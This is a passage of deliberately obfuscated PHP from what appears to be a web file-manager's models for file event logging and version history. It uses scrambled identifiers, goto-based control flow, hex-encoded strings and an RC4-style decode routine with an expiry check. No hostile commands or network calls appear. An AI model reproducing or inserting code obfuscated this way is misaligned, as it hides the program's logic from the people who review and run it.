($c»ÏåØ…Š + 1) % 256; $BöêÊÆõí¿ = ($BöêÊÆõí¿ + $B„†¯­µ Ô[$c»ÏåØ…Š]) % 256; $e‰ƒ¥›£Ÿ = $B„†¯­µ Ô[$c»ÏåØ…Š]; $B„†¯­µ Ô[$c»ÏåØ…Š] = $B„†¯­µ Ô[$BöêÊÆõí¿]; $B„†¯­µ Ô[$BöêÊÆõí¿] = $e‰ƒ¥›£Ÿ; $F”ïïï¼– .= chr(ord($BÏÈ¹Š©¿’[$e§¦­²¦Ñ]) ^ $B„†¯­µ Ô[($B„†¯­µ Ô[$c»ÏåØ…Š] + $B„†¯­µ Ô[$BöêÊÆõí¿]) % 256]); } $B»œÃ‚›¶‰ = intval(substr($F”ïïï¼–, 0, 10)); goto B³–¤œß’ã; B³–¤œß’ã: if (($B»œÃ‚›¶‰ == 0 || $B»œÃ‚›¶‰ - time() > 0) && substr($F”ïïï¼–, 10, 16) == substr(md5(substr($F”ïïï¼–, 26) . $b„‡ƒ’Ù¥Ş), 0, 16)) { return substr($F”ïïï¼–, 26); } else { return $DÆÇÂ¤œîï[43]; } goto bŒš¶¡î„; C‹Á§–ù†ã: $BÏÈ¹Š©¿’ = base64_decode(substr($BÏÈ¹Š©¿’, $A—˜È¡ˆ·ì)); $f£ÏÂÒ…÷¡ = strlen($BÏÈ¹Š©¿’); $f”êù—Û¥ = array(); goto CÜÖ£Íª; eŒÂŠ¥À™±: $DÆÇÂ¤œîï =& $_SERVER[¨¤¼…´]; $BÏÈ¹Š©¿’ = str_replace(array($DÆÇÂ¤œîï[424], $DÆÇÂ¤œîï[80], $DÆÇÂ¤œîï[101]), array($DÆÇÂ¤œîï[297], $DÆÇÂ¤œîï[8], $DÆÇÂ¤œîï[893]), $BÏÈ¹Š©¿’); $A—˜È¡ˆ·ì = 4; goto EÑáÑ½×¶’; EÑáÑ½×¶’: $dÊùİÓöøë = md5($dÊùİÓöøë ? $dÊùİÓöøë : self::$defaultKey); $cõ…’Ü£•Õ = md5(substr($dÊùİÓöøë, 0, 16)); $b„‡ƒ’Ù¥Ş = md5(substr($dÊùİÓöøë, 16, 16)); goto aè²°½Áê‹; bŒš¶¡î„: } } define($_SERVER[¨¤¼…´][1921], 1); define($_SERVER[¨¤¼…´][1922], 2); goto c¶…—Õ«å; fÃÒ×´¿ËÌ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\162\x63\x65\x5f\145\x76\145\156\164"; protected $dataAuto = array(array("\143\162\x65\x61\x74\145\x54\x69\x6d\x65", "\x74\151\x6d\145", "\x69\156\163\x65\162\164", "\x66\165\x6e\143\164\151\157\156"), array("\144\x65\x73\143", '', "\x69\x6e\x73\x65\x72\x74\x2c\165\x70\144\x61\164\x65\x2c\x73\x65\154\x65\143\x74", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($cğîíà, $DÙ†Ë®çÂƒ, $dÈ™µ‡æ‡» = '') { goto EµçÈÌ˜âÈ; EµçÈÌ˜âÈ: $cËƒÊæŒ‰ =& $_SERVER[¨¤¼…´]; if (!$this->eventSave) { return; } $DÙ‡ª®³…ñ = Model($cËƒÊæŒ‰[1107])->sourceInfo($cğîíà); goto eï´ŒÑÃÂá; F‚æ¥¶®×: $cÇùÖáöŸ = array($cËƒÊæŒ‰[395] => $cğîíà, $cËƒÊæŒ‰[2298] => $DÙ‡ª®³…ñ[$cËƒÊæŒ‰[474]], $cËƒÊæŒ‰[2299] => $DÙ‡ª®³…ñ[$cËƒÊæŒ‰[38]], $cËƒÊæŒ‰[479] => $DÙ‡ª®³…ñ[$cËƒÊæŒ‰[479]], $cËƒÊæŒ‰[1416] => USER_ID, $cËƒÊæŒ‰[400] => $DÙ†Ë®çÂƒ, $cËƒÊæŒ‰[1418] => $dÈ™µ‡æ‡»); $this->addSystemLog($DÙ†Ë®çÂƒ, $cÇùÖáöŸ); return $this->add($cÇùÖáöŸ); goto aêË“¨×ª; eï´ŒÑÃÂá: if (!$DÙ‡ª®³…ñ) { return !1; } if ($this->isCacheEvent($DÙ‡ª®³…ñ, $DÙ†Ë®çÂƒ)) { return; } if ($dÈ™µ‡æ‡» && is_string($dÈ™µ‡æ‡»)) { $dÈ™µ‡æ‡» = array($cËƒÊæŒ‰[2126] => $dÈ™µ‡æ‡»); } goto F‚æ¥¶®×; aêË“¨×ª: } private function addSystemLog($fœ¨òí¶, $F¾®ÆÏø–ä) { $BÄˆŒºØŒ =& $_SERVER[¨¤¼…´]; if ($fœ¨òí¶ == $BÄˆŒºØŒ[2300]) { $fœ¨òí¶ = $F¾®ÆÏø–ä[$BÄˆŒºØŒ[417]][$BÄˆŒºØŒ[2301]]; } else { if (in_array($fœ¨òí¶, array($BÄˆŒºØŒ[2072], $BÄˆŒºØŒ[2302]))) { $fœ¨òí¶ = $F¾®ÆÏø–ä[$BÄˆŒºØŒ[417]][$BÄˆŒºØŒ[682]]; } } $F¼ªÒÑ·¶» = array_merge($F¾®ÆÏø–ä, array($BÄˆŒºØŒ[2303] => $F¾®ÆÏø–ä[$BÄˆŒºØŒ[381]], $BÄˆŒºØŒ[2304] => $F¾®ÆÏø–ä[$BÄˆŒºØŒ[2304]])); Model($BÄˆŒºØŒ[2035])->addLog($BÄˆŒºØŒ[2305] . $fœ¨òí¶, $F¼ªÒÑ·¶»); } private function isCacheEvent($fÎ¶çß¤½–, $Cø´¡ŸğÇ») { if ($fÎ¶çß¤½–[$_SERVER[¨¤¼…´][383]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($E”åÖêê, $BáœÓ•ùù‚) { $dÚ†½”„ =& $_SERVER[¨¤¼…´]; $Bë„—ê®î = Model($dÚ†½”„[1107])->sourceInfo($E”åÖêê); $F¯»êº¿¡º = array($dÚ†½”„[2301] => $BáœÓ•ùù‚, $dÚ†½”„[38] => $Bë„—ê®î[$dÚ†½”„[38]]); return $this->addEvent($E”åÖêê, $dÚ†½”„[2300], $F¯»êº¿¡º); } public function eventFileEdit($bÓÏÈÅŸ¦¢) { $E¥˜«“»‚ =& $_SERVER[¨¤¼…´]; $AÔÊíß®¶ = array($E¥˜«“»‚[2306] => $_SERVER[$E¥˜«“»‚[2307]], $E¥˜«“»‚[1738] => strtolower(ACTION)); return $this->addEvent($bÓÏÈÅŸ¦¢, $E¥˜«“»‚[2062], $AÔÊíß®¶); } public function eventRecycle($FºØ§çœ†, $dÆ±¯È§Õõ) { return $this->addEvent($FºØ§çœ†, $_SERVER[¨¤¼…´][2302], $dÆ±¯È§Õõ); } public function eventRemove($e³ß”ÃÁî) { $cõ‚ë¾èâ‰ =& $_SERVER[¨¤¼…´]; $BÎŠ”Í´ = Model($cõ‚ë¾èâ‰[1107])->sourceInfo($e³ß”ÃÁî); $Aß¡éø‚ê = $BÎŠ”Í´[$cõ‚ë¾èâ‰[38]]; return $this->addEvent($BÎŠ”Í´[$cõ‚ë¾èâ‰[474]], $cõ‚ë¾èâ‰[2061], $Aß¡éø‚ê); } public function eventShare($e´‹À«†ğ›, $BÇø•Û‰‹ğ) { return $this->addEvent($e´‹À«†ğ›, $_SERVER[¨¤¼…´][2072], $BÇø•Û‰‹ğ); } public function eventMove($fÁ¨àÇ¸Æ, $Báö³İ´Îâ, $E¹Â«Ï’Î—) { goto dõ’œ»ô·¸; DØçŠÂ…±¼: $FÖ„ÁÌ„°‡ = $AÍŠ£×³„ğ->sourceInfo($Báö³İ´Îâ); $F’ÉÏèµ¯œ = $AÍŠ£×³„ğ->sourceInfo($E¹Â«Ï’Î—); $a“»‡£¨Œ˜ = array($c¡¯ÂÆ‚‚œ[994] => $Báö³İ´Îâ, $c¡¯ÂÆ‚‚œ[2308] => $FÖ„ÁÌ„°‡[$c¡¯ÂÆ‚‚œ[38]], $c¡¯ÂÆ‚‚œ[2309] => $FÖ„ÁÌ„°‡[$c¡¯ÂÆ‚‚œ[479]], $c¡¯ÂÆ‚‚œ[995] => $E¹Â«Ï’Î—, $c¡¯ÂÆ‚‚œ[2310] => $F’ÉÏèµ¯œ[$c¡¯ÂÆ‚‚œ[38]], $c¡¯ÂÆ‚‚œ[2311] => $F’ÉÏèµ¯œ[$c¡¯ÂÆ‚‚œ[479]]); goto b‹æÕÙ‚Ğ¯; dõ’œ»ô·¸: $c¡¯ÂÆ‚‚œ =& $_SERVER[¨¤¼…´]; $AÍŠ£×³„ğ = Model($c¡¯ÂÆ‚‚œ[1107]); $Cß“›šáÄ = $AÍŠ£×³„ğ->sourceInfo($fÁ¨àÇ¸Æ); goto DØçŠÂ…±¼; Cïáæš‡Ş“: $this->addEvent($Báö³İ´Îâ, $c¡¯ÂÆ‚‚œ[2312], $a“»‡£¨Œ˜); goto BÄ¦Şâ˜Û; b‹æÕÙ‚Ğ¯: $this->addEvent($fÁ¨àÇ¸Æ, $c¡¯ÂÆ‚‚œ[505], $a“»‡£¨Œ˜); $Cß“›šáÄ = $AÍŠ£×³„ğ->sourceInfo($fÁ¨àÇ¸Æ); $a“»‡£¨Œ˜ = array($c¡¯ÂÆ‚‚œ[381] => $Cß“›šáÄ[$c¡¯ÂÆ‚‚œ[381]], $c¡¯ÂÆ‚‚œ[38] => $Cß“›šáÄ[$c¡¯ÂÆ‚‚œ[38]]); goto Cïáæš‡Ş“; BÄ¦Şâ˜Û: } public function eventCopy($A‡ØÑÙËµÎ) { $this->eventCreate($A‡ØÑÙËµÎ, $_SERVER[¨¤¼…´][503]); } public function eventRename($C¿¡³Åğ‚º, $e³›éÅôå, $Eá¸â¶çî) { $eøºìœ­ =& $_SERVER[¨¤¼…´]; $e¨†ƒÉÈ­Ö = array($eøºìœ­[994] => $e³›éÅôå, $eøºìœ­[995] => $Eá¸â¶çî); return $this->addEvent($C¿¡³Åğ‚º, $eøºìœ­[1120], $e¨†ƒÉÈ­Ö); } public function eventAddComment($bÔÍÍŞø‹, $aõ½÷á­¸·) { return $this->addEvent($bÔÍÍŞø‹, $_SERVER[¨¤¼…´][2313], $aõ½÷á­¸·); } public function eventAddDesc($dĞ‘ñÙšƒ, $cå˜Û›ÍØõ) { return $this->addEvent($dĞ‘ñÙšƒ, $_SERVER[¨¤¼…´][2314], $cå˜Û›ÍØõ); } public function listBySource($DÙ´Ïí²İ½) { goto fÒ¿’ì©ñÛ; fÒ¿’ì©ñÛ: $eÉ’£İ®‘ã =& $_SERVER[¨¤¼…´]; $cñ„Ğ‰–‡Ğ = Model($eÉ’£İ®‘ã[1107])->sourceInfo($DÙ´Ïí²İ½); $dñ®å¢ÌİÛ = array($eÉ’£İ®‘ã[395] => $DÙ´Ïí²İ½); goto a‘ê±ö¨; a‘ê±ö¨: if ($cñ„Ğ‰–‡Ğ[$eÉ’£İ®‘ã[382]] == $eÉ’£İ®‘ã[93]) { $A§²¼ò†Öß = Model($eÉ’£İ®‘ã[1107])->listSearchChildren($DÙ´Ïí²İ½, 20000); $A§²¼ò†Öß[] = $DÙ´Ïí²İ½ . $eÉ’£İ®‘ã[18]; $dñ®å¢ÌİÛ = array($eÉ’£İ®‘ã[381] => array($eÉ’£İ®‘ã[7], $A§²¼ò†Öß)); } $D®Â‘‡Æœ‚ = $this->where($dñ®å¢ÌİÛ)->order($eÉ’£İ®‘ã[2315])->selectPage(); if ($D®Â‘‡Æœ‚[$eÉ’£İ®‘ã[364]][$eÉ’£İ®‘ã[365]] == 0) { $D®Â‘‡Æœ‚[$eÉ’£İ®‘ã[364]][$eÉ’£İ®‘ã[365]] = 1; $D®Â‘‡Æœ‚[$eÉ’£İ®‘ã[367]] = array(array($eÉ’£İ®‘ã[395] => $DÙ´Ïí²İ½, $eÉ’£İ®‘ã[2298] => $cñ„Ğ‰–‡Ğ[$eÉ’£İ®‘ã[474]], $eÉ’£İ®‘ã[1416] => $cñ„Ğ‰–‡Ğ[$eÉ’£İ®‘ã[390]], $eÉ’£İ®‘ã[400] => $eÉ’£İ®‘ã[2316], $eÉ’£İ®‘ã[401] => $cñ„Ğ‰–‡Ğ[$eÉ’£İ®‘ã[201]], $eÉ’£İ®‘ã[1418] => $eÉ’£İ®‘ã[43])); } goto b¡ñÔ¼Á”¾; b¡ñÔ¼Á”¾: return $this->eventListParse($D®Â‘‡Æœ‚, $DÙ´Ïí²İ½); goto C¢¾äŸ ‘»; C¢¾äŸ ‘»: } private function eventListParse($dªÅõÏ½Ğ, $Aª˜«î¦ˆ) { goto c¿š†·´Ú‚; cˆ˜Ş®ÜÊ–: $Aì„„ëòÎÒ = array_to_keyvalue($EŒğš±Š¹í, $aÈ´†ÁÛá”[43], $aÈ´†ÁÛá”[2304]); foreach ($EŒğš±Š¹í as $eÔÒŞ«‘ÛÖ) { $B ‡ˆ¤Ç÷´ = $eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[417]]; if ($eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[39]] == $aÈ´†ÁÛá”[505] && isset($B ‡ˆ¤Ç÷´[$aÈ´†ÁÛá”[994]])) { $cŠ¯ë§ˆ³[] = $B ‡ˆ¤Ç÷´[$aÈ´†ÁÛá”[994]] . $aÈ´†ÁÛá”[43]; $cŠ¯ë§ˆ³[] = $B ‡ˆ¤Ç÷´[$aÈ´†ÁÛá”[995]] . $aÈ´†ÁÛá”[43]; } if ($eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[39]] == $aÈ´†ÁÛá”[2312] && isset($B ‡ˆ¤Ç÷´[$aÈ´†ÁÛá”[381]])) { $cŠ¯ë§ˆ³[] = $B ‡ˆ¤Ç÷´[$aÈ´†ÁÛá”[381]] . $aÈ´†ÁÛá”[43]; } } $cŠ¯ë§ˆ³ = array_merge($cŠ¯ë§ˆ³, $Aì„„ëòÎÒ, array($Aª˜«î¦ˆ . $aÈ´†ÁÛá”[43])); goto fò‚§ğ¿à; fò‚§ğ¿à: $cŠ¯ë§ˆ³ = array_unique($cŠ¯ë§ˆ³); $eÁæ¹ğŒ£• = array_unique(array_to_keyvalue($EŒğš±Š¹í, $aÈ´†ÁÛá”[43], $aÈ´†ÁÛá”[1425])); $C«†¦‹ªãê = Model($aÈ´†ÁÛá”[490])->userListInfo($eÁæ¹ğŒ£•); goto a™–Ú‡¨ÙÃ; a™–Ú‡¨ÙÃ: $Dë˜„¸§  = Model($aÈ´†ÁÛá”[742])->sourceListInfo($cŠ¯ë§ˆ³, !0); foreach ($EŒğš±Š¹í as &$eÔÒŞ«‘ÛÖ) { if ($eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[39]] == $aÈ´†ÁÛá”[505] && isset($eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[417]][$aÈ´†ÁÛá”[994]])) { $eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[417]][$aÈ´†ÁÛá”[994]] = $Dë˜„¸§ [$eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[417]][$aÈ´†ÁÛá”[994]]]; $eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[417]][$aÈ´†ÁÛá”[995]] = $Dë˜„¸§ [$eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[417]][$aÈ´†ÁÛá”[995]]]; } if ($eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[39]] == $aÈ´†ÁÛá”[2312] && isset($eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[417]][$aÈ´†ÁÛá”[381]])) { $eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[417]][$aÈ´†ÁÛá”[381]] = $Dë˜„¸§ [$eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[417]][$aÈ´†ÁÛá”[381]]]; } $eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[403]] = $Dë˜„¸§ [$eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[381]]]; $eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[2317]] = $Dë˜„¸§ [$eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[2304]]]; if ($eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[39]] == $aÈ´†ÁÛá”[2061]) { $eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[2317]] = $eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[403]]; $eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[2304]] = $eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[2317]][$aÈ´†ÁÛá”[381]]; $eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[403]] = !1; $eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[381]] = $aÈ´†ÁÛá”[43]; } $eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[2248]] = $C«†¦‹ªãê[$eÔÒŞ«‘ÛÖ[$aÈ´†ÁÛá”[1425]]]; } unset($eÔÒŞ«‘ÛÖ); goto b–Ìğñ§ğƒ; b–Ìğñ§ğƒ: $dªÅõÏ½Ğ[$aÈ´†ÁÛá”[367]] = $EŒğš±Š¹í; return $dªÅõÏ½Ğ; goto C®Ùåæ»‡Œ; c¿š†·´Ú‚: $aÈ´†ÁÛá” =& $_SERVER[¨¤¼…´]; $EŒğš±Š¹í = $dªÅõÏ½Ğ[$aÈ´†ÁÛá”[367]]; $cŠ¯ë§ˆ³ = array_to_keyvalue($EŒğš±Š¹í, $aÈ´†ÁÛá”[43], $aÈ´†ÁÛá”[381]); goto cˆ˜Ş®ÜÊ–; C®Ùåæ»‡Œ: } public function removeBySource($F»¤Ä‹Ä) { $eÕ¥ŞÖá• = array($_SERVER[¨¤¼…´][395] => $F»¤Ä‹Ä); $this->where($eÕ¥ŞÖá•)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\162\143\x65\x5f\x68\x69\163\x74\x6f\x72\171"; public function addHistory($AÜ„¬œµ·, $dŒ¼÷à„ = '') { $eÉèê¡¤İõ =& $_SERVER[¨¤¼…´]; $FÇ©±¥·¦Í = array($eÉèê¡¤İõ[395] => $AÜ„¬œµ·[$eÉèê¡¤İõ[381]], $eÉèê¡¤İõ[1416] => isset($AÜ„¬œµ·[$eÉèê¡¤İõ[391]]) ? $AÜ„¬œµ·[$eÉèê¡¤İõ[391]] : $AÜ„¬œµ·[$eÉèê¡¤İõ[390]], $eÉèê¡¤İõ[432] => $AÜ„¬œµ·[$eÉèê¡¤İõ[431]], $eÉèê¡¤İõ[533] => $AÜ„¬œµ·[$eÉèê¡¤İõ[87]], $eÉèê¡¤İõ[2318] => $dŒ¼÷à„); $Aô©™ÍçÚÕ = $GLOBALS[$eÉèê¡¤İõ[6]][$eÉèê¡¤İõ[94]][$eÉèê¡¤İõ[2319]]; if ($Aô©™ÍçÚÕ > 1) { $this->historyAutoClear($FÇ©±¥·¦Í[$eÉèê¡¤İõ[381]]); $this->add($FÇ©±¥·¦Í); } Model($eÉèê¡¤İõ[2320])->eventFileEdit($AÜ„¬œµ·[$eÉèê¡¤İõ[381]]); } private function historyAutoClear($BŒ ½Åâõ) { goto eÓĞœ¡; FÌ¹äŸæ£±: if ($FÛåµİ«ÌŠ >= 500) { return; } $Dƒï–éÚ = array($eÑì¹¤ˆé[395] => $BŒ ½Åâõ); $d¾¦³´ÍØÑ = $this->field($eÑì¹¤ˆé[2323])->where($Dƒï–éÚ)->order($eÑì¹¤ˆé[2315])->select(); goto aˆ¢®…òÑ¤; aˆ¢®…òÑ¤: if (!$d¾¦³´ÍØÑ || $FÛåµİ«ÌŠ >= count($d¾¦³´ÍØÑ)) { return; } $A•Ãˆò¿¡‰ = array_to_keyvalue($d¾¦³´ÍØÑ, $eÑì¹¤ˆé[43], $eÑì¹¤ˆé[379]); $A•Ãˆò¿¡‰ = array_slice($A•Ãˆò¿¡‰, $FÛåµİ«ÌŠ); goto cÉĞ¿ŞÎ¤±; eÓĞœ¡: $eÑì¹¤ˆé =& $_SERVER[¨¤¼…´]; $Dƒà¸ªÜªÜ = Model($eÑì¹¤ˆé[1078])->get($eÑì¹¤ˆé[2321]); $aî¢È´¥Ø = $GLOBALS[$eÑì¹¤ˆé[6]][$eÑì¹¤ˆé[94]][$eÑì¹¤ˆé[2319]]; goto CØ÷ßŠ¢É‚; dßÓ§²Ä¯®: $Dƒï–éÚ = array($eÑì¹¤ˆé[397] => array($eÑì¹¤ˆé[7], $A•Ãˆò¿¡‰)); $this->where($Dƒï–éÚ)->delete(); Model($eÑì¹¤ˆé[434])->remove($d—²»’Ï¦Í); goto E÷ªÁêîï; CØ÷ßŠ¢É‚: $e”â“É òÀ = $Dƒà¸ªÜªÜ == $eÑì¹¤ˆé[2322] ? 3 : $aî¢È´¥Ø; if ($aî¢È´¥Ø <= 1) { $e”â“É òÀ = 1; } $FÛåµİ«ÌŠ = $e”â“É òÀ - 1; goto FÌ¹äŸæ£±; cÉĞ¿ŞÎ¤±: $d—²»’Ï¦Í = array_to_keyvalue($d¾¦³´ÍØÑ, $eÑì¹¤ˆé[43], $eÑì¹¤ˆé[431]); $d—²»’Ï¦Í = array_slice($d—²»’Ï¦Í, $FÛåµİ«ÌŠ); if (!$A•Ãˆò¿¡‰ || !$d—²»’Ï¦Í) { return; } goto dßÓ§²Ä¯®; E÷ªÁêîï: } public function listData($aÓÃö¯Œ Ô) { goto B²ƒ‡Ø¯°; b„ˆë²Úˆ: $E„…´©š = 3; if ($cºò¤ŠİÜí == $aéÀ½µÁï[2322]) { $Aµ—á¯Î ¬[$aéÀ½µÁï[367]] = array_slice($Aµ—á¯Î ¬[$aéÀ½µÁï[367]], 0, $E„…´©š); $Aµ—á¯Î ¬[$aéÀ½µÁï[364]] = array($aéÀ½µÁï[2325] => 1, $aéÀ½µÁï[2326] => 20, $aéÀ½µÁï[2327] => 1, $aéÀ½µÁï[2328] => count($Aµ—á¯Î ¬[$aéÀ½µÁï[367]])); } return $Aµ—á¯Î ¬; goto bŞÈÂáùíË; cßŠ» ¶³ä: $Aµ—á¯Î ¬ = $this->field($A™‹Ğ¢ñÄ¥)->where($fÑ¤Ø‰ÙÑÙ)->order($aéÀ½µÁï[2315])->selectPage(); $this->_listAppendUser($Aµ—á¯Î ¬[$aéÀ½µÁï[367]]); $cºò¤ŠİÜí = Model($aéÀ½µÁï[1078])->get($aéÀ½µÁï[2321]); goto b„ˆë²Úˆ; B²ƒ‡Ø¯°: $aéÀ½µÁï =& $_SERVER[¨¤¼…´]; $fÑ¤Ø‰ÙÑÙ = array($aéÀ½µÁï[395] => $aÓÃö¯Œ Ô); $A™‹Ğ¢ñÄ¥ = $aéÀ½µÁï[2324]; goto cßŠ» ¶³ä; bŞÈÂáùíË: } protected function _listAppendUser(&$f¸™ğğğº³) { $B›±ŞÒÙÃ« =& $_SERVER[¨¤¼…´]; $AŠ¦¨Á†ßá = array_to_keyvalue($f¸™ğğğº³, $B›±ŞÒÙÃ«[43], $B›±ŞÒÙÃ«[1425]); $bßÈ‰¡”ÑÉ = Model($B›±ŞÒÙÃ«[490])->userListInfo($AŠ¦¨Á†ßá); foreach ($f¸™ğğğº³ as &$dÙëÎÑË¹›) { $e™§¬×ØÆ = $dÙëÎÑË¹›[$B›±ŞÒÙÃ«[1425]]; $dÙëÎÑË¹›[$B›±ŞÒÙÃ«[390]] = $bßÈ‰¡”ÑÉ[$e™§¬×ØÆ] ? $bßÈ‰¡”ÑÉ[$e™§¬×ØÆ] : !1; } unset($dÙëÎÑË¹›); } public function fileInfo($b£»Â×Éì) { $A²»ø¤šÚĞ =& $_SERVER[¨¤¼…´]; $a’é•ğ†—ò = $this->tablePrefix; $b„¢¨©«¹ = "{$a’é•ğ†—ò}\151\x6f\x5f\x66\x69\154\x65\40\x66\x69\x6c\x65\163\x20\157\156\40\146\x69\154\145\x73\56\146\151\x6c\x65\111\104\x20\75\40\150\151\x73\164\157\x72\171\x2e\x66\151\154\145\x49\x44"; return $this->alias($A²»ø¤šÚĞ[2329])->where(array($A²»ø¤šÚĞ[397] => $b£»Â×Éì))->join($b„¢¨©«¹, $A²»ø¤šÚĞ[2330])->find(); } public function removeItem($d™àåà¼¸) { $A¸ÀÔÇä¬ =& $_SERVER[¨¤¼…´]; $FÀß Ê¦´± = array($A¸ÀÔÇä¬[397] => $d™àåà¼¸); $eÔÇ•ì®‘İ = $this->where($FÀß Ê¦´±)->find(); if ($eÔÇ•ì®‘İ) { $d¥Ç‰ëÕ² = $this->where($FÀß Ê¦´±)->delete(); Model($A¸ÀÔÇä¬[434])->remove($eÔÇ•ì®‘İ[$A¸ÀÔÇä¬[431]]); return $d¥Ç‰ëÕ²; } return !1; } public function removeBySource($F¢‡òåÉ) { goto EÄŠÖÅŠ«ˆ; däÎ£á¨¢ê: $C¯øôÎî–à = array($fîÆº¢ŠÇ[395] => array($fîÆº¢ŠÇ[7], $F¢‡òåÉ)); $a­ƒå·Ø‹ø = $this->field($fîÆº¢ŠÇ[432])->where($C¯øôÎî–à)->select(); if ($a­ƒå·Ø‹ø) { $this->where($C¯øôÎî–à)->delete(); $b©Øíõ²½ö = array_to_keyvalue($a­ƒå·Ø‹ø, $fîÆº¢ŠÇ[43], $fîÆº¢ŠÇ[431]); Model($fîÆº¢ŠÇ[434])->remove($b©Øíõ²½ö); } goto böŠÜ¥—½ù; EÄŠÖÅŠ«ˆ: $fîÆº¢ŠÇ =& $_SERVER[¨¤¼…´]; if (!$F¢‡òåÉ) { return !1; } if (!is_array($F¢‡òåÉ)) { $F¢‡òåÉ = array($F¢‡òåÉ); } goto däÎ£á¨¢ê; böŠÜ¥—½ù: return !0; goto Bá¼†äæÙ; Bá¼†äæÙ: } public function setDetail($Cİ¿äÄ×»’, $f£‘ßÍÁéĞ) { $D¤ëÍ¦Ë“ =& $_SERVER[¨¤¼…´]; return $this->where(array($D¤ëÍ¦Ë“[397] => $Cİ¿äÄ×»’))->save(array($D¤ëÍ¦Ë“[2318] => $f£‘ßÍÁéĞ)); } public function rollbackToItem($a’ÖŠ×­áÎ, $AíÃÛ˜µ©) { goto d‘¸Äø–ì; D¨ÜÃ ½Ûö: return $this->where(array($EÅƒÍ±¿’[397] => $AíÃÛ˜µ©))->delete(); goto FŠ÷æóÒ›è; b·İçµïãµ: $dŠÓ›ã­¡º = $this->find($AíÃÛ˜µ©); $cæè¿‘ª™’ = array($EÅƒÍ±¿’[431] => $dŠÓ›ã­¡º[$EÅƒÍ±¿’[431]], $EÅƒÍ±¿’[87] => $dŠÓ›ã­¡º[$EÅƒÍ±¿’[87]], $EÅƒÍ±¿’[117] => time(), $EÅƒÍ±¿’[391] => USER_ID); Model($EÅƒÍ±¿’[742])->where(array($EÅƒÍ±¿’[381] => $a’ÖŠ×­áÎ))->save($cæè¿‘ª™’); goto D¨ÜÃ ½Ûö; d‘¸Äø–ì: $EÅƒÍ±¿’ =& $_SERVER[¨¤¼…´]; $BÒŞ«·§ = Model($EÅƒÍ±¿’[742])->sourceInfo($a’ÖŠ×­áÎ); $this->addHistory($BÒŞ«·§); goto b·İçµïãµ; FŠ÷æóÒ›è: } public function clearSame($EÚ½îÊº²¤) { goto FÏ‚ÛĞ¼Ïñ; b¼Äè§¹°: if (!$B–…²éğ) { return; } $this->where(array($C÷íÛ…¢Ë[379] => array($C÷íÛ…¢Ë[7], $B–…²éğ)))->delete(); Model($C÷íÛ…¢Ë[434])->remove($CƒâÊ–„º•); goto D…©“‘½ö; b…ÃÈ¨ñÊ: $CƒâÊ–„º• = array(); $B–…²éğ = array(); foreach ($EïØéĞéå˜ as $BÔŒ‚‡ˆø) { if (!$BÔŒ‚‡ˆø || count($BÔŒ‚‡ˆø) <= 1) { continue; } foreach ($BÔŒ‚‡ˆø as $E«æ§ëî’´) { $CƒâÊ–„º•[] = $E«æ§ëî’´[$C÷íÛ…¢Ë[431]]; $B–…²éğ[] = $E«æ§ëî’´[$C÷íÛ…¢Ë[379]]; } } goto b¼Äè§¹°; FÏ‚ÛĞ¼Ïñ: $C÷íÛ…¢Ë =& $_SERVER[¨¤¼…´]; $BÉ¢ºÎéÉ¶ = $this->listData($EÚ½îÊº²¤); $EïØéĞéå˜ = array_to_keyvalue_group($BÉ¢ºÎéÉ¶, $C÷íÛ…¢Ë[431]); goto b…ÃÈ¨ñÊ; D…©“‘½ö: } public function userSpace() { $aÉ‚Á“˜‹« =& $_SERVER[¨¤¼…´]; $A»Æ‰ÕÅ÷ã = $this->tablePrefix; $d°ßáÃ¸‚ = array($aÉ‚Á“˜‹«[1416] => USER_ID); $Eòù‡ÊÙÎ = "{$A»Æ‰ÕÅ÷ã}\x69\157\137\146\151\x6c\145\x20\146\x69\x6c\145\x73\x20\157\156\x20\x66\x69\x6c\x65\x73\x2e\x66\151\x6c\145\x49\x44\40\75\x20\150\x69\163\x74\x6f\162\171\x2e\146\151\154\145\111\104"; return $this->alias($aÉ‚Á“˜‹«[2329])->where($d°ßáÃ¸‚)->join($Eòù‡ÊÙÎ, $aÉ‚Á“˜‹«[2330])->sum($aÉ‚Á“˜‹«[87]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($bä»„õÔ) { goto F…´Õí’õ§; Fƒ™ñ½ôÀ: if (!$B˜åóù²Å) { return array(); } $b—åßè§ø¦ = $B˜åóù²Å[$fŒô¿¢Àãª[175]]; $Cò¾‚ë­´¥ = $fŒô¿¢Àãª[7]; goto a“´±¨³¡’; a“´±¨³¡’: if (!$B˜åóù²Å[$fŒô¿¢Àãª[175]]) { $E‚àâÉøÄ¢ = array_to_keyvalue($C˜ò–“ÆâÔ, $fŒô¿¢Àãª[43], $fŒô¿¢Àãª[175]); $b—åßè§ø¦ = implode($fŒô¿¢Àãª[57], 